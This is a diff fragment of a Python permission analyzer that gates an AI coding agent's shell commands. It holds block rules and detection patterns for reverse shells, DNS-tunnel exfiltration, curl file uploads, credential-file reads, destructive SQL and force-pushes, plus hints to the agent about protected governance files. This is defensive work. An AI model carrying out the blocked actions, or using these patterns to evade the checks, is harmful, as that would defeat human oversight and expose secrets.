+        "sql_create_table_as_select_protected",
+    ),
+    (
+        r"PRAGMA\s+writable_schema",
+        "pragma_writable_schema",
+    ),  # flips SQLite's schema table writable — arbitrary catalog rewrite
     (r"chmod\s+(?:-[\w-]+\s+)*(?:777|a\+rwx)\s+/\S*", "chmod_777_root"),
     # git push --force / -f / --force-with-lease (2026-08-18). This module had
     # ZERO matchers for it: `permission_request.py` names it in its own
@@ -1586,21 +2398,34 @@ HIGH_RISK_PATTERNS = [
     # `--delete`/`-d` is deliberately NOT here: removing a stale remote branch
     # is routine and rewrites no history, and `test_r5_benign_push_still_
     # approved` pins it as APPROVE.
-    (r"\bgit\b(?:\s+-{1,2}[A-Za-z][^\s;&|]*(?:\s+[^\s;&|-][^\s;&|]*)?)*\s+push\b"
-     r"(?:(?:[^|;&\n]|\\\n)*?\s)?"
-     r"(?:--force-with-lease(?:=[^\s;&|]*)?|--force|--mirror"
-     r"|-[a-zA-Z]*f|\+[^\s;&|]+)"
-     r"(?=[\s;&|'\"()]|$)", "git_push_force"),
+    (
+        r"\bgit\b(?:\s+-{1,2}[A-Za-z][^\s;&|]*(?:\s+[^\s;&|-][^\s;&|]*)?)*\s+push\b"
+        r"(?:(?:[^|;&\n]|\\\n)*?\s)?"
+        r"(?:--force-with-lease(?:=[^\s;&|]*)?|--force|--mirror"
+        r"|-[a-zA-Z]*f|\+[^\s;&|]+)"
+        r"(?=[\s;&|'\"()]|$)",
+        "git_push_force",
+    ),
 ]
 
 # [S4] Branches whose deletion via `git push --delete`/`-d`/a `:<ref>` empty-
 # source refspec must DENY even though it carries no --force flag (the
 # force-push matcher above deliberately treats `--delete` as routine — it
 # is, for a throwaway feature branch, but not for one of these).
-PROTECTED_BRANCHES = frozenset({
-    "main", "master", "production", "release", "develop", "trunk",
-    "staging", "prod", "premium-main", "premium-full",
-})
+PROTECTED_BRANCHES = frozenset(
+    {
+        "main",
+        "master",
+        "production",
+        "release",
+        "develop",
+        "trunk",
+        "staging",
+        "prod",
+        "premium-main",
+        "premium-full",
+    }
+)
 _PROTECTED_BRANCH_PREFIXES = ("release/", "hotfix/")
 
 
@@ -1638,6 +2463,8 @@ def _git_push_deleted_ref(cmd: str) -> str | None:
     if m:
         return m.group(1)
     return None
+
+
 # Rule ids [panel-review, P1]: each entry above carries its own stable id as
 # a (regex, rule_id) tuple, not a parallel dict keyed by position
 # (HIGH_RISK_PATTERNS[-1]). A positional key silently re-points itself every
@@ -1664,6 +2491,22 @@ _HIGH_RISK_PATTERN_LABELS = {
     "chmod_777_root": "chmod 777 on a root-level path",
     "git_push_force": "git push --force",
 }
+
+# The subset of HIGH_RISK_PATTERNS rule_ids that protect DB tables/schema
+# specifically (as opposed to chmod_777_root/git_push_force, which are not
+# DB-path-scoped at all) — see _sql_table_check_scoped_to_production above.
+_DB_TABLE_PROTECTION_RULE_IDS = frozenset(
+    {
+        "drop_table",
+        "drop_database",
+        "drop_trigger",
+        "delete_unbounded_audit_table",
+        "delete_tautology_audit_table",
+        "mutate_protected_table",
+        "sql_create_table_as_select_protected",
+        "pragma_writable_schema",
+    }
+)
 
 ALLOWED_DELETIONS = [
     "node_modules",
@@ -1703,6 +2546,28 @@ AUTO_APPROVE_TOOLS = {
 MAX_SESSION_COST_USD = 5.0
 MAX_SAME_REJECTION = 2  # After 2 identical rejections → ESCALATE
 
+_CD_PREFIX_RE = re.compile(r"^\s*cd\s+\S+\s*(?:&&|;)\s*")
+
+
+def _dedup_anchor(text: str) -> str:
+    """Strips a leading `cd <dir> &&`/`cd <dir>;` navigation prefix before a
+    repeat-rejection dedup comparison (_check_repeat_rejections). Root cause of a
+    real false positive (found 2026-09-02): two functionally unrelated Bash
+    commands sharing a long `cd <same-worktree-path> && ...` habit collided
+    purely on that shared prefix once truncated to detail[:50] -- not because of
+    anything about what either command actually did. A genuinely repeated
+    command (identical prefix and all) still anchors to itself every time, so
+    the loop-breaker's real purpose is unaffected.
+
+    Scope note: this strips only a leading `cd` navigation prefix. Any other
+    long shared literal prefix between two unrelated commands (e.g. a repeated
+    `python3 -c "..."` invocation boilerplate) can still collide the same way --
+    a broader fix (hashing/anchoring on the full normalized command rather than
+    a short prefix) is a separate, larger change, deliberately not bundled here.
+    """
+    return _CD_PREFIX_RE.sub("", text, count=1)
+
+
 # Informational hints per denial type (help Claude self-correct)
 DENIAL_HINTS: dict[str, str] = {
     "blocked_path:.env": (
@@ -1710,8 +2575,7 @@ DENIAL_HINTS: dict[str, str] = {
         "Or use export KEY=value in bash without touching the file."
     ),
     "blocked_path:schema_v2.sql": (
-        "Add the SQL migration in a new file: "
-        "database/migrations/YYYYMMDD_description.sql"
+        "Add the SQL migration in a new file: " "database/migrations/YYYYMMDD_description.sql"
     ),
     "blocked_path:CLAUDE.md": (
         "System instructions cannot be modified from code. "
@@ -1782,8 +2646,7 @@ DENIAL_HINTS: dict[str, str] = {
         "governance-escalated, so you cannot add it yourself."
     ),
     "budget_exceeded": (
-        "Split the objective into smaller subtasks. "
-        "Start a new session with j --autonomous"
+        "Split the objective into smaller subtasks. " "Start a new session with j --autonomous"
     ),
     "repeat_rejection": (
         "This action was rejected multiple times. "
@@ -1796,6 +2659,92 @@ DENIAL_HINTS: dict[str, str] = {
 # In-process fallback counter for DENY/ESCALATE when DB is unavailable
 _proc_rejection_counts: dict[str, int] = {}
 _proc_rejection_lock = _threading.Lock()
+
+
+# 2026-08-20 (A3a). Ver _simple_segments y PermissionAnalyzer._write_signal.
+# `|` solo separa si no viene de `>` o `&`: `>|` y `2>&1` son un operador, no un
+# pipe, y partirlos dejaba el destino de la redireccion en otro segmento.
+_SEGMENT_SPLIT_RE = re.compile(r"&&|\|\||\|&|(?<![>&])\||[;\n]")
+# `cd` cambia el cwd para el segmento siguiente, y `pushd`/`(cd ...)` igual: si
+# se separan, un destino relativo deja de resolverse contra el directorio real.
+_CWD_CHANGE_RE = re.compile(r"\b(?:cd|pushd|popd)\b|[(){}]")
+
+
+def _cwd_only_leading(cmd: str) -> bool:
+    """True iff cwd is established once, in a leading run of cd/pushd
+    segments, and never changes again for the rest of the command (2026-09-04
+    false positive: a benign `cd $DIR && cp src dest` was falling back to
+    whole-command substring matching purely because ANY cd anywhere used to
+    bail _simple_segments to None, denying/escalating on a path mentioned
+    only as cp's read-only SOURCE). popd and subshell braces anywhere still
+    return False (order-dependent / genuinely ambiguous) — same conservative
+    stance as before for those; only the common single-leading-cd shape is
+    loosened.
+    """
+    if re.search(r"\bpopd\b|[(){}]", cmd):
+        return False
+    masked = list(cmd)
+    for m in _QUOTED_SPAN_RE.finditer(cmd):
+        start, end = m.span()
+        for i in range(start + 1, end - 1):
+            masked[i] = "x"
+    masked_str = "".join(masked)
+    matches = list(_SEGMENT_SPLIT_RE.finditer(masked_str))
+    segs = []
+    last = 0
+    for m in matches:
+        segs.append(cmd[last : m.start()].strip())
+        last = m.end()
+    segs.append(cmd[last:].strip())
+    segs = [s for s in segs if s]
+    i = 0
+    while i < len(segs) and re.match(r"^(?:cd|pushd)\b", segs[i]):
+        i += 1
+    return not any(re.search(r"\b(?:cd|pushd)\b", s) for s in segs[i:])
+
+
+def _simple_segments(cmd: str) -> list[str] | None:
+    """Los segmentos de un pipeline demostrablemente simple, o None.
+
+    None significa "no se puede afirmar donde acaba un comando y empieza el
+    siguiente" y conserva el comportamiento anterior: el comando entero como una
+    sola unidad. Un `;` dentro de comillas no es un separador (la confusion que
+    hundio la Fase B) — pero antes se resolvia descartando la segmentacion
+    entera ante CUALQUIER comilla, aunque estuviera balanceada y fuera de
+    contenido irrelevante al separador (p.ej. `echo "...$?..."` al final de un
+    pipeline compuesto). Eso hacia caer todo el comando al fallback de
+    coincidencia de substring contra el comando entero, que no distingue un
+    path que aparece como fuente de `<` (lectura) de un path realmente
+    escrito — falso positivo confirmado (2026-08-21, stress test). Con
+    comillas balanceadas, se enmascara solo su interior (mismo patron que
+    _mask_quotes_for_readonly) y se buscan separadores fuera de ese
+    enmascarado; los segmentos se recortan del CMD original por posicion, asi
+    que el contenido real de las comillas no se pierde para el analisis
+    posterior de cada segmento.
+    """
+    if _OPAQUE_SHELL_RE.search(cmd):
+        return None
+    if _CWD_CHANGE_RE.search(cmd) and not _cwd_only_leading(cmd):
+        return None
+    if cmd.count("'") % 2 or cmd.count('"') % 2:
+        return None
+    masked = list(cmd)
+    for m in _QUOTED_SPAN_RE.finditer(cmd):
+        start, end = m.span()
+        for i in range(start + 1, end - 1):
+            masked[i] = "x"
+    masked_str = "".join(masked)
+    matches = list(_SEGMENT_SPLIT_RE.finditer(masked_str))
+    if not matches:
+        return None
+    segs = []
+    last = 0
+    for m in matches:
+        segs.append(cmd[last : m.start()].strip())
+        last = m.end()
+    segs.append(cmd[last:].strip())
+    segs = [s for s in segs if s]
+    return segs if len(segs) > 1 else None
 
 
 class PermissionAnalyzer:
@@ -1815,9 +2764,9 @@ class PermissionAnalyzer:
         # DENIED), `*.pyc` became `.pyc` (never equal to `foo.pyc`), and
         # `plugins/cache/` collapsed to a bare `cache` (approving
         # `<anything>/cache` — wider than documented).
-        allowed_names: set[str] = set()      # exact final path component
-        allowed_suffixes: set[str] = set()   # from `*.ext` globs
-        allowed_tails: set[str] = set()      # multi-component relative tails
+        allowed_names: set[str] = set()  # exact final path component
+        allowed_suffixes: set[str] = set()  # from `*.ext` globs
+        allowed_tails: set[str] = set()  # multi-component relative tails
         for tok in ALLOWED_DELETIONS:
             t = tok.strip().strip("/")
             if not t:
@@ -1832,7 +2781,7 @@ class PermissionAnalyzer:
                 allowed_names.add(t)
 
         targets: list[str] = []
-        for m in re.finditer(r'\brm\b((?:\s+-{1,2}[a-zA-Z]+)*)((?:\s+[^\s;&|]+)+)', cmd):
+        for m in re.finditer(r"\brm\b((?:\s+-{1,2}[a-zA-Z]+)*)((?:\s+[^\s;&|]+)+)", cmd):
             arg_blob = m.group(2)
             for arg in arg_blob.split():
                 if arg.startswith("-"):
@@ -1845,91 +2794,50 @@ class PermissionAnalyzer:
             return False
 
         for tgt in targets:
-            # Absolute paths are only safe if they resolve inside a project dir
-            if tgt.startswith("/"):
-                real_tgt = os.path.realpath(os.path.normpath(tgt))
-                if not any(real_tgt.startswith(os.path.realpath(safe)) for safe in SAFE_PROJECT_DIRS):
+            # Canonicalize every target (absolute or relative) before the
+            # safety check — a relative escape like "./../../" previously
+            # skipped this branch entirely because it doesn't start with "/".
+            expanded = os.path.expandvars(os.path.expanduser(tgt))
+            real_tgt = os.path.realpath(os.path.normpath(expanded))
+            if real_tgt.startswith("/"):
+                if not any(
+                    real_tgt.startswith(os.path.realpath(safe)) for safe in SAFE_PROJECT_DIRS
+                ):
                     return False
             norm = tgt.rstrip("/")
             last = norm.rsplit("/", 1)[-1]
             if last in allowed_names:
                 continue
             if any(
-                last.endswith(suffix) and len(last) > len(suffix)
-                for suffix in allowed_suffixes
+                last.endswith(suffix) and len(last) > len(suffix) for suffix in allowed_suffixes
             ):
                 continue
-            if any(
-                norm == tail or norm.endswith("/" + tail)
-                for tail in allowed_tails
-            ):
+            if any(norm == tail or norm.endswith("/" + tail) for tail in allowed_tails):
                 continue
             return False
         return True
 
-    def _bash_touches_blocked(self, cmd: str, tool: str = "Bash") -> dict | None:
-        """Block Bash (or a context-mode exec-equivalent) commands that
-        read credential paths or write to any blocked path.
+    def _write_signal(self, cmd: str, tool: str) -> tuple[bool, list[str] | None, dict | None]:
+        """(escribe?, destinos-de-copiador, veredicto-temprano) para CMD.
 
-        `tool` is only used as the label on the returned decision — every
-        heuristic below still reasons over `cmd`, the flattened command text
-        (see _ctx_mode_command_text for the non-Bash callers).
+        Extraida de _bash_touches_blocked sin cambios de logica, para poder
+        preguntarsela a un segmento suelto (A3a). El tercer elemento existe
+        porque la deteccion de inline-exec no resoluble escala aqui dentro:
+        el llamante lo devuelve tal cual en vez de perderlo.
         """
-        # 1. Credential paths — block any access (read or write) using path-component matching
-        for cred in BASH_CREDENTIAL_PATHS:
-            # Match as path component: must be preceded/followed by space, quote, slash, or string boundary
-            pattern = r'(?:^|[\s\'">/=@:(`$])' + re.escape(cred) + r'(?:[\s\'"/=@:;|)(&<>`$]|$)'
-            if re.search(pattern, cmd):
-                return self._deny(
-                    tool, cmd,
-                    f"Credential path '{cred}' referenced in Bash — access blocked.",
-                    "CRITICAL",
-                    f"bash_credential_path:{cred}",
-                    "Use os.environ.get() for secrets. Never reference credential files in Bash.",
-                )
-        # 1b. Widened credential match. The literal loop above needs a
-        # boundary character immediately before the token, so 'cat prod.env',
-        # 'cat config/app.env' and 'base64 certs/server.pem' slipped through.
-        # Tokenize and reuse the same matcher the read family uses, so Bash and
-        # Read/Grep/Glob cannot disagree about what counts as a credential.
-        # Tokenized on a quote-collapsed working copy (2026-08-18) —
-        # Bash concatenates directly-adjacent quoted literals ('.en''v' ->
-        # .env), which the split-on-quote-chars tokenizer never reconstructs
-        # from the raw command. `cmd` itself is untouched; every other check
-        # in this function still sees the original string.
-        _cred_cmd = _collapse_adjacent_quotes(cmd)
-        for tok in _BASH_TOKEN_SPLIT_RE.split(_cred_cmd):
-            tok = tok.strip().strip("'\"")
-            if not tok or tok.startswith("-"):
-                continue
-            hit = _credential_hit(tok)
-            if hit:
-                return self._deny(
-                    tool, cmd,
-                    f"Credential path '{tok}' referenced in Bash — access blocked ('{hit}').",
-                    "CRITICAL",
-                    f"bash_credential_path:{hit}",
-                    "Use os.environ.get() for secrets. Never reference credential files in Bash.",
-                )
-            # A glob token ('.e*', '?env') has no exact basename to
-            # match, but it can still be crafted to expand onto a known
-            # credential file. Ask the reverse question via fnmatch.
-            glob_hit = _credential_glob_hit(tok)
-            if glob_hit:
-                return self._deny(
-                    tool, cmd,
-                    f"Glob '{tok}' in Bash would match credential file "
-                    f"'{glob_hit}' — access blocked.",
-                    "CRITICAL",
-                    f"bash_credential_glob:{glob_hit}",
-                    "Reference the file explicitly, or use os.environ.get() for secrets.",
-                )
-        # 2. All BLOCKED_PATHS — block write operations
-        is_write = any(sign in cmd for sign in _BASH_WRITE_SIGNS)
+        _copy_only_dests = None
+        # A4: `WHERE id > 1` dentro del literal SQL no es una redireccion.
+        is_write = _bash_write_sign_hit(
+            _mask_inert_python(_mask_quotes_for_readonly(_mask_sql_literals(cmd)))
+        )
         if not is_write:
             # Detect sqlite3/psql/mysql with DML (writes to DB without shell write operators)
-            if re.search(r'\b(?:sqlite3|psql|mysql|mariadb)\b', cmd):
-                if re.search(r'\b(?:INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|REPLACE)\b', cmd, re.IGNORECASE):
+            if re.search(r"\b(?:sqlite3|psql|mysql|mariadb)\b", cmd):
+                if re.search(
+                    r"\b(?:INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|REPLACE)\b",
+                    cmd,
+                    re.IGNORECASE,
+                ):
                     is_write = True
         if not is_write:
             # Detect python/perl writing inline (2026-08-18):
@@ -1939,22 +2847,35 @@ class PermissionAnalyzer:
             # treat it as Python context unconditionally instead of requiring
             # the token.
             cmd_lower = cmd.lower()
-            _py_context = tool in _CTX_MODE_EXEC_TOOLS or "python" in cmd_lower or "perl" in cmd_lower
+            _py_context = (
+                tool in _CTX_MODE_EXEC_TOOLS or "python" in cmd_lower or "perl" in cmd_lower
+            )
             if _py_context and "open(" in cmd:
                 is_write = any(q in cmd for q in ("'w'", '"w"', "'a'", '"a"', "'x'", '"x"'))
-            if not is_write and _py_context and (
-                "write_text(" in cmd or "write_bytes(" in cmd
-                or re.search(r'\bshutil\.(?:copy\w*|move|rmtree)\s*\(', cmd)
-                or re.search(r'\bos\.(?:remove|unlink|rmdir|rename|replace|truncate)\s*\(', cmd)
-                or re.search(r'\bsubprocess\.(?:run|Popen|call|check_call|check_output)\s*\(', cmd)
-                # [RT12] os.system/os.popen/pty.spawn hand a full shell
-                # command to the OS; eval/exec/compile run arbitrary Python.
-                # Both are strictly more powerful than a single file write,
-                # so they're folded into the same is_write path rather than
-                # a parallel blocklist — see the unresolvable-target
-                # ESCALATE immediately below for the part a target-path
-                # check alone can't cover.
-                or _INLINE_EXEC_RE.search(cmd)
+            if (
+                not is_write
+                and _py_context
+                and (
+                    "write_text(" in cmd
+                    or "write_bytes(" in cmd
+                    or re.search(r"\bshutil\.(?:copy\w*|move|rmtree)\s*\(", cmd)
+                    or re.search(
+                        r"\bos\.(?:remove|unlink|rmdir|rename|replace|truncate)\s*\(",
+                        cmd,
+                    )
+                    or re.search(
+                        r"\bsubprocess\.(?:run|Popen|call|check_call|check_output)\s*\(",
+                        cmd,
+                    )
+                    # [RT12] os.system/os.popen/pty.spawn hand a full shell
+                    # command to the OS; eval/exec/compile run arbitrary Python.
+                    # Both are strictly more powerful than a single file write,
+                    # so they're folded into the same is_write path rather than
+                    # a parallel blocklist — see the unresolvable-target
+                    # ESCALATE immediately below for the part a target-path
+                    # check alone can't cover.
+                    or _INLINE_EXEC_RE.search(cmd)
+                )
             ):
                 is_write = True
             # [RT12] A literal inline-exec argument ("os.system('ls')") is
@@ -1971,15 +2892,20 @@ class PermissionAnalyzer:
                 for _m in _INLINE_EXEC_RE.finditer(cmd):
                     _arg = _py_inline_call_first_arg(cmd, _m.end())
                     if _arg is not None and not _py_arg_is_resolvable(_arg):
-                        return self._escalate(
-                            tool, cmd[:80],
-                            f"Inline Python call ('{_m.group(0)}...') passes a "
-                            "non-literal argument (variable/sys.argv/f-string) "
-                            "whose runtime value cannot be statically checked "
-                            "— human review required.",
-                            "bash_inline_exec_unresolvable_target",
-                            "Use a literal argument, or confirm the runtime "
-                            "value with the user before approving.",
+                        return (
+                            is_write,
+                            _copy_only_dests,
+                            self._escalate(
+                                tool,
+                                cmd[:80],
+                                f"Inline Python call ('{_m.group(0)}...') passes a "
+                                "non-literal argument (variable/sys.argv/f-string) "
+                                "whose runtime value cannot be statically checked "
+                                "— human review required.",
+                                "bash_inline_exec_unresolvable_target",
+                                "Use a literal argument, or confirm the runtime "
+                                "value with the user before approving.",
+                            ),
                         )
         if not is_write:
             # Detect cp/mv/rsync/install/ln/dd (incl. sudo/absolute-path prefixes,
@@ -1990,12 +2916,28 @@ class PermissionAnalyzer:
             # `sudo cp`, `/bin/cp`, a second line after `\n`, or `dd of=...`
             # (found by stress test, 2026-08-11 — first pass covered only the
             # bare unprefixed, single-line case).
-            if re.search(r'(?:^|[;&|\n]\s*)(?:sudo\s+)?(?:[\w./-]*/)?(?:cp|mv|rsync|install|ln)\b', cmd, re.MULTILINE) or \
-               re.search(r'\bdd\s+(?:\S+\s+)*of=', cmd) or \
-               re.search(r'\bshutil\.(?:copy\w*|move)\s*\(', cmd) or \
-               re.search(r'\bos\.(?:replace|rename)\s*\(', cmd) or \
-               re.search(r'\.write_(?:text|bytes)\s*\(', cmd):
+            _shell_copy = re.search(
+                # Las comillas cuentan como inicio: sin ellas, `bash -c 'cp x
+                # <blocked>'` no activaba is_write y se APROBABA (agujero
+                # preexistente, medido 2026-08-20). La shell anidada reejecuta
+                # su argumento como codigo, asi que ahi si empieza un comando.
+                r"(?:^|[;&|\n]\s*|['\"])(?:sudo\s+)?(?:[\w./-]*/)?(?:cp|mv|rsync|install|ln)\b",
+                cmd,
+                re.MULTILINE,
+            )
+            _other_copy = (
+                re.search(r"\bdd\s+(?:\S+\s+)*of=", cmd)
+                or re.search(r"\bshutil\.(?:copy\w*|move)\s*\(", cmd)
+                or re.search(r"\bos\.(?:replace|rename)\s*\(", cmd)
+                or re.search(r"\.write_(?:text|bytes)\s*\(", cmd)
+            )
+            if _shell_copy or _other_copy:
                 is_write = True
+                # A3b: si la unica señal es un copiador de shell simple, lo que
+                # se escribe es su destino. Con cualquier otra señal presente el
+                # destino ya no basta para describir el comando.
+                if _shell_copy and not _other_copy:
+                    _copy_only_dests = _copy_family_destinations(cmd)
         if not is_write:
             # 2026-08-18: write primitives that reach a target path
             # without any shell write operator or a name matched above —
@@ -2008,15 +2950,17 @@ class PermissionAnalyzer:
             # session against a governance path should still be escalated
             # for human visibility, matching the conservative bias already
             # used above for sqlite3 DML detection).
-            _tar_mode = re.search(r'\btar\s+(-?[a-zA-Z]{1,8})\b', cmd)
-            if re.search(r'\bpatch\b', cmd) or \
-               re.search(r'\bgit\s+apply\b', cmd) or \
-               re.search(r'\bgit\s+checkout\b[^|;&\n]*--', cmd) or \
-               (_tar_mode and "x" in _tar_mode.group(1).lower()) or \
-               _archive_dest_dirs(cmd) or \
-               re.search(r'\btar\b[^|;&\n]*--extract\b', cmd) or \
-               re.search(r'\bunzip\b', cmd) or \
-               re.search(r'(?:^|[\s;&|])ed\s+\S', cmd):
+            _tar_mode = re.search(r"\btar\s+(-?[a-zA-Z]{1,8})\b", cmd)
+            if (
+                re.search(r"\bpatch\b", cmd)
+                or re.search(r"\bgit\s+apply\b", cmd)
+                or re.search(r"\bgit\s+checkout\b[^|;&\n]*--", cmd)
+                or (_tar_mode and "x" in _tar_mode.group(1).lower())
+                or _archive_dest_dirs(cmd)
+                or re.search(r"\btar\b[^|;&\n]*--extract\b", cmd)
+                or re.search(r"\bunzip\b", cmd)
+                or re.search(r"(?:^|[\s;&|])ed\s+\S", cmd)
+            ):
                 is_write = True
         if not is_write:
             # 2026-08-18: sed --in-place, perl -i, interactive
@@ -2024,6 +2968,79 @@ class PermissionAnalyzer:
             # write or create a target with none of the signs above present.
             if any(p.search(cmd) for p in _BASH_WRITE_SIGN_PATTERNS):
                 is_write = True
+        return is_write, _copy_only_dests, None
+
+    def _bash_touches_blocked(self, cmd: str, tool: str = "Bash") -> dict | None:
+        """Block Bash (or a context-mode exec-equivalent) commands that
+        read credential paths or write to any blocked path.
+
+        `tool` is only used as the label on the returned decision — every
+        heuristic below still reasons over `cmd`, the flattened command text
+        (see _ctx_mode_command_text for the non-Bash callers).
+        """
+        # 1. Credential paths — block any access (read or write) using path-component matching
+        for cred in BASH_CREDENTIAL_PATHS:
+            # Match as path component: must be preceded/followed by space, quote, slash, or string boundary
+            pattern = r'(?:^|[\s\'">/=@:(`$])' + re.escape(cred) + r'(?:[\s\'"/=@:;|)(&<>`$]|$)'
+            if re.search(pattern, cmd):
+                return self._deny(
+                    tool,
+                    cmd,
+                    f"Credential path '{cred}' referenced in Bash — access blocked.",
+                    "CRITICAL",
+                    f"bash_credential_path:{cred}",
+                    "Use os.environ.get() for secrets. Never reference credential files in Bash.",
+                )
+        # 1b. Widened credential match. The literal loop above needs a
+        # boundary character immediately before the token, so 'cat prod.env',
+        # 'cat config/app.env' and 'base64 certs/server.pem' slipped through.
+        # Tokenize and reuse the same matcher the read family uses, so Bash and
+        # Read/Grep/Glob cannot disagree about what counts as a credential.
+        # Tokenized on a quote-collapsed working copy (2026-08-18) —
+        # Bash concatenates directly-adjacent quoted literals ('.en''v' ->
+        # .env), which the split-on-quote-chars tokenizer never reconstructs
+        # from the raw command. `cmd` itself is untouched; every other check
+        # in this function still sees the original string.
+        _cred_cmd = _collapse_adjacent_quotes(cmd)
+        # A4: un `*` de SQL citado no es un glob de ficheros.
+        _sql_globs = _globs_are_sql_only(_cred_cmd)
+        _recent: list[str] = []
+        for tok in _BASH_TOKEN_SPLIT_RE.split(_cred_cmd):
+            tok = tok.strip().strip("'\"")
+            if not tok:
+                continue
+            _prev = _recent[-2:]
+            _recent.append(tok)
+            if tok.startswith("-"):
+                continue
+            hit = _credential_hit(tok)
+            if hit:
+                return self._deny(
+                    tool,
+                    cmd,
+                    f"Credential path '{tok}' referenced in Bash — access blocked ('{hit}').",
+                    "CRITICAL",
+                    f"bash_credential_path:{hit}",
+                    "Use os.environ.get() for secrets. Never reference credential files in Bash.",
+                )
+            # A glob token ('.e*', '?env') has no exact basename to
+            # match, but it can still be crafted to expand onto a known
+            # credential file. Ask the reverse question via fnmatch.
+            glob_hit = _credential_glob_hit(tok)
+            if glob_hit and not _sql_globs and not _is_glob_exclusion_argument(_prev):
+                return self._deny(
+                    tool,
+                    cmd,
+                    f"Glob '{tok}' in Bash would match credential file "
+                    f"'{glob_hit}' — access blocked.",
+                    "CRITICAL",
+                    f"bash_credential_glob:{glob_hit}",
+                    "Reference the file explicitly, or use os.environ.get() for secrets.",
+                )
+        # 2. All BLOCKED_PATHS — block write operations
+        is_write, _copy_only_dests, _early = self._write_signal(cmd, tool)
+        if _early:
+            return _early
         if is_write:
             # 2026-08-18: match against the raw command,
             # the quote/backslash-collapsed command, and every relative
@@ -2032,11 +3049,25 @@ class PermissionAnalyzer:
             # `cd /root/dqiii8/.claude && echo x > settings.json` (the
             # blocked token never appears literally) and quote/backslash
             # splicing (`CLA''UDE.md`, `CLA\UDE.md`).
-            _targets = _bash_resolved_write_targets(cmd)
+            # A3a: cada segmento aporta candidatos solo si el segmento
+            # mismo escribe. Sin segmentacion, el comando entero como antes.
+            _segments = _simple_segments(cmd)
+            if _segments:
+                _targets = []
+                _full_cwd = _bash_effective_cwd(cmd)
+                for _seg in _segments:
+                    _seg_write, _seg_dests, _ = self._write_signal(_seg, tool)
+                    if _seg_write:
+                        _targets.extend(
+                            _bash_resolved_write_targets(_seg, _seg_dests, cwd_override=_full_cwd)
+                        )
+            else:
+                _targets = _bash_resolved_write_targets(cmd, _copy_only_dests)
             blocked = next((h for h in (_blocked_path_hit(t) for t in _targets) if h), None)
             if blocked:
                 return self._deny(
-                    tool, cmd,
+                    tool,
+                    cmd,
                     f"Blocked path '{blocked}' targeted by Bash write operation.",
                     "CRITICAL",
                     f"bash_write_blocked_path:{blocked}",
@@ -2044,10 +3075,15 @@ class PermissionAnalyzer:
                 )
             # Governance corpus via shell: same policy as the Edit/Write
             # and MCP routes — escalate, never silently allow.
-            gov = next((h for h in (_governance_path_hit(t) for t in _targets) if h), None)
+            _gov_hits = [h for h in (_governance_path_hit(t) for t in _targets) if h]
+            # most-specific-wins: several resolved Bash targets can share
+            # this list, and a coarse .claude/ root hit must never shadow a
+            # more specific named-subdir hit found on another target.
+            gov = max(_gov_hits, key=len) if _gov_hits else None
             if gov:
                 return self._escalate(
-                    tool, cmd[:80],
+                    tool,
+                    cmd[:80],
                     f"Bash write targets the DQIII8 governance corpus ('{gov}') — "
                     "human confirmation required.",
                     f"bash_write_governance_path:{gov}",
@@ -2060,15 +3096,18 @@ class PermissionAnalyzer:
                 bg_hit = _blocked_glob_hit(tok)
                 if bg_hit:
                     return self._deny(
-                        tool, cmd,
+                        tool,
+                        cmd,
                         f"Glob token in Bash write would match blocked path '{bg_hit}'.",
-                        "CRITICAL", f"bash_write_blocked_glob:{bg_hit}",
+                        "CRITICAL",
+                        f"bash_write_blocked_glob:{bg_hit}",
                         "Reference the file explicitly. Bash cannot bypass path restrictions via globbing.",
                     )
                 gg_hit = _governance_glob_hit(tok)
                 if gg_hit:
                     return self._escalate(
-                        tool, cmd[:80],
+                        tool,
+                        cmd[:80],
                         f"Glob token in Bash write would match governance path '{gg_hit}' — human confirmation required.",
                         f"bash_write_governance_glob:{gg_hit}",
                         "Confirm the governance change with the user before writing.",
@@ -2087,15 +3126,18 @@ class PermissionAnalyzer:
                 _bh = _blocked_path_hit(_norm)
                 if _bh:
                     return self._deny(
-                        tool, cmd,
+                        tool,
+                        cmd,
                         f"Blocked path '{_bh}' targeted by a DB-client SQL statement.",
-                        "CRITICAL", f"bash_sql_blocked_path:{_bh}",
+                        "CRITICAL",
+                        f"bash_sql_blocked_path:{_bh}",
                         "Do not ATTACH/VACUUM INTO a protected path from a DB client.",
                     )
                 _gh = _governance_path_hit(_norm)
                 if _gh:
                     return self._escalate(
-                        tool, cmd[:80],
+                        tool,
+                        cmd[:80],
                         f"DB-client SQL statement targets the DQIII8 governance "
                         f"corpus ('{_gh}') — human confirmation required.",
                         f"bash_sql_governance_path:{_gh}",
@@ -2108,22 +3150,30 @@ class PermissionAnalyzer:
         # reverse-shell one-liner names no curl/wget/nc/socat token at all,
         # so gating this on that list would miss exactly the obfuscated
         # shapes it exists to catch.
-        if _REVERSE_SHELL_RE.search(cmd) or _interpreter_socket_shell_hit(cmd):
+        if (
+            _REVERSE_SHELL_RE.search(cmd)
+            or _interpreter_socket_shell_hit(cmd)
+            or _mkfifo_backpipe_hit(cmd)
+        ):
             return self._deny(
-                tool, cmd,
+                tool,
+                cmd,
                 "Command matches a reverse-shell shape "
                 "(mkfifo/telnet/nc backpipe, socat exec:, or an interpreter "
                 "one-liner combining a socket-open call with a shell-exec call).",
-                "CRITICAL", "bash_web_egress_reverse_shell",
+                "CRITICAL",
+                "bash_web_egress_reverse_shell",
                 "Reverse shells are never approved from an agent session.",
             )
 
         if _DNS_EXFIL_RE.search(cmd):
             return self._deny(
-                tool, cmd,
+                tool,
+                cmd,
                 "Command builds a DNS lookup (host/nslookup/dig) from a "
                 "command substitution — DNS-tunnel exfiltration shape.",
-                "CRITICAL", "bash_web_egress_dns_tunnel",
+                "CRITICAL",
+                "bash_web_egress_dns_tunnel",
                 "Never build a DNS query argument from command output.",
             )
 
@@ -2134,10 +3184,12 @@ class PermissionAnalyzer:
             # @-file attachment.
             if _UPLOAD_FORM_RE.search(cmd):
                 return self._deny(
-                    tool, cmd,
+                    tool,
+                    cmd,
                     "Command uploads a local file via curl "
                     "(--upload-file/-T or -F/--form with an @-attachment).",
-                    "CRITICAL", "bash_web_egress_upload_form",
+                    "CRITICAL",
+                    "bash_web_egress_upload_form",
                     "Confirm the file and destination with the user before uploading.",
                 )
             # [S6] Archive/compress/encode tool piped straight into a
@@ -2150,19 +3202,23 @@ class PermissionAnalyzer:
             # pipe form is covered.
             if _ARCHIVE_PIPE_TO_NET_RE.search(cmd):
                 return self._deny(
-                    tool, cmd,
+                    tool,
+                    cmd,
                     "Command pipes a compressed/encoded payload directly "
                     "into a network command.",
-                    "CRITICAL", "bash_web_egress_archive_pipe",
